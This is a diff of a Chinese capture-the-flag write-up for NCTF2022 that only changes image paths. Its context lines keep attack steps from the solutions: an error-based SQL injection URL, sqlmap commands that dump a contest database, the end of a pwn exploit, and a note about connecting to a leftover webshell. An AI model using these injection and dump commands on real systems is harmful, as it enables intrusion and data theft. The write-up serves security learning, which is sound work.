@@ -185,7 +185,7 @@ for i in range(height):
 img3.show()
 ```
 
-![img](/images/NCTF2022/img01.png)
+![img](./img01.png)
 
 ## MISC
 
@@ -195,13 +195,13 @@ misc，AK！
 
 ida 动态调试 patch 到指定地点，慢慢猜
 
-![img](/images/NCTF2022/img02.png)
+![img](./img02.png)
 
 ### 只因因
 
 拿第二段 DNA 去网站上搜索，可以搜到一个叫 CFTR 的基因片段，就是 flag。
 
-![img](/images/NCTF2022/img03.png)
+![img](./img03.png)
 
 ### qrssssssss
 
@@ -283,7 +283,7 @@ if __name__ == "__main__":
 
 将输出导入 excel
 
-![img](/images/NCTF2022/img04.png)
+![img](./img04.png)
 
 根据修改时间排序，输出扫描结果
 
@@ -293,7 +293,7 @@ NCTF{737150-eeb-465-e91-110a8fb}
 
 根据 hint LMQH，查到二维码的纠错级别
 
-![img](/images/NCTF2022/img05.png)
+![img](./img05.png)
 
 根据描述写脚本输出二维码纠错级别
 
@@ -387,17 +387,17 @@ if __name__ == "__main__":
 
 同理导出到 excel 里
 
-![img](/images/NCTF2022/img06.png)
+![img](./img06.png)
 
 发现根据 LMQH 排序的话，是满足 flag 的顺序的
 
-![img](/images/NCTF2022/img07.png)
+![img](./img07.png)
 
 后续在每一个纠错等级的图片中根据扫描出来的内容找出八张不一样二维码，分别查询他们的掩码，根据掩码排序即为 flag
 
 NCTF{62130783efd44b3692b4ddbecf}
 
-![img](/images/NCTF2022/img08.png)
+![img](./img08.png)
 
 ### 炉边聚会
 
@@ -771,17 +771,17 @@ array(3) {
 
 一张图片 fd.png，用 foremost 可以分离出一个压缩包。不知道咋搞就放着爆破，居然出了。
 
-![img](/images/NCTF2022/img09.jpeg)
+![img](./img09.jpeg)
 
 解压压缩包之后得到 flag.txt 和 something。flag.txt 是四层 base64 解码的 fakeflag。。
 
-![img](/images/NCTF2022/img10.png)
+![img](./img10.png)
 
 something 是 gpg 私钥文件。
 
 再次观察 fd.png，发现最右边有三排像素点。裁剪下来，使用 stegsolve 提取 lsb 数据，得到一段 python 代码和 gpg 的密码：%$#%$#jhgasdfg76342t
 
-![img](/images/NCTF2022/img11.png)
+![img](./img11.png)
 
 ```python
 from cv2 import cv2
@@ -905,7 +905,7 @@ edit(payload)
 io.interactive()
 ```
 
-![img](/images/NCTF2022/img12.png)
+![img](./img12.png)
 
 ## WEB
 
@@ -919,7 +919,7 @@ http://162.14.110.241:8099/sql.php?id=1 and gtid_subset(concat(0x71,(select data
 
 读取到当前数据库为 users
 
-![img](/images/NCTF2022/img13.png)
+![img](./img13.png)
 
 sqlmap
 
@@ -927,7 +927,7 @@ sqlmap
 sqlmap -u http://162.14.110.241:8099/sql.php?id=1 -v 3 -D users --tables --random-agent
 ```
 
-![img](/images/NCTF2022/img14.png)
+![img](./img14.png)
 
 表名为 table
 
@@ -935,7 +935,7 @@ sqlmap -u http://162.14.110.241:8099/sql.php?id=1 -v 3 -D users --tables --rando
 sqlmap -u http://162.14.110.241:8099/sql.php?id=1 -v 3 -D users -T info --columns --random-agent
 ```
 
-![img](/images/NCTF2022/img15.png)
+![img](./img15.png)
 
 dump password
 
@@ -943,7 +943,7 @@ dump password
 sqlmap -u http://162.14.110.241:8099/sql.php?id=1 -v 3 -D users -T info --dump --random-agent
 ```
 
-![img](/images/NCTF2022/img16.png)
+![img](./img16.png)
 
 nctf{9815e617-dd93-4bf4-bddf-7a972e916c36}
 
@@ -951,7 +951,7 @@ nctf{9815e617-dd93-4bf4-bddf-7a972e916c36}
 
 瞎试的时候发现有个 123.php，用 123 连接成功了。。静态容器非预期了
 
-![img](/images/NCTF2022/img17.png)
+![img](./img17.png)
 
 nctf{61c18f463f17cd82b7fac5a4c07dff23}
 
@@ -993,7 +993,7 @@ print(flag)
 
 ida 打开，发现要输入 key 和明文
 
-![img](/images/NCTF2022/img18.png)
+![img](./img18.png)
 
 首先是 key，利用动态调试得到 sub_405baf 的替换表，异或解密即可，脚本如下
 
@@ -1021,9 +1021,9 @@ print(bytes(key))
 
 之后在密钥扩展函数发现数字，搜索发现是 SM4 加密常量，直接在线求解
 
-![img](/images/NCTF2022/img19.png)
+![img](./img19.png)
 
-![img](/images/NCTF2022/img20.png)
+![img](./img20.png)
 
 ### Ccccha
 
@@ -1155,7 +1155,7 @@ static main()
 
 之后 7.5 的 ida 反编译结果死活不对，7.6 就可以了，效果如下
 
-![img](/images/NCTF2022/img21.png)
+![img](./img21.png)
 
 就是一个异或和加的加密，动态调试把 v3dump 下来求解即可
 
@@ -1270,11 +1270,11 @@ while opcode[i]!=0xffffffff:
 
 此外由于开始因为确定密文的位置，将看起来像密文的数据 42 位一组隔开，如下图，对分析过程也有不小的帮助
 
-![img](/images/NCTF2022/img22.png)
+![img](./img22.png)
 
 整体流程是，将输入加一个数字，比如第一个”N“+721
 
-![img](/images/NCTF2022/img23.png)
+![img](./img23.png)
 
 循环”N“+721 次，每次加 28475 位置的值，即(”N“+721)\*0xe3
 
@@ -1282,7 +1282,7 @@ while opcode[i]!=0xffffffff:
 
 最后差值要等于 28601 位置的值，即 0x6a
 
-![img](/images/NCTF2022/img24.png)
+![img](./img24.png)
 
 倒着解密即可
 
@@ -1315,7 +1315,7 @@ print(bytes(m))
 
 binwalk 一把梭
 
-![img](/images/NCTF2022/img25.png)
+![img](./img25.png)
 
 xor()函数就是按位异或，静态没有值，也不想模拟了，直接暴力全异或一遍看一眼。最后 base64 即可
 
